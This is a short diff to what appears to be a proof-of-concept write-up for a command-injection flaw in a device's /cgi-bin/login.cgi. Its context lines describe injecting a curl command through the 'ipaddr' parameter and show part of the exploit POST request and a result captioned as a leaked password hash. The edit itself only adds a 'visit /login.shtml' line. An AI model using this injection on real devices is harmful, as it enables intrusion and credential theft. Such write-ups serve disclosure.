@@ -100,7 +100,7 @@ This PoC uses the `ipaddr` parameter to inject a `curl` command, which sends a r
 
 #### Full PoC HTTP Request
 
-
+visit /login.shtml
 
 ```
 POST /cgi-bin/login.cgi HTTP/1.1
@@ -137,6 +137,7 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=%3A%3Affff%3A192.168.10.15
 
 
 ![PoC Result: Right Password Hash (Success)](./imgs/5.png)
+
 
 
 
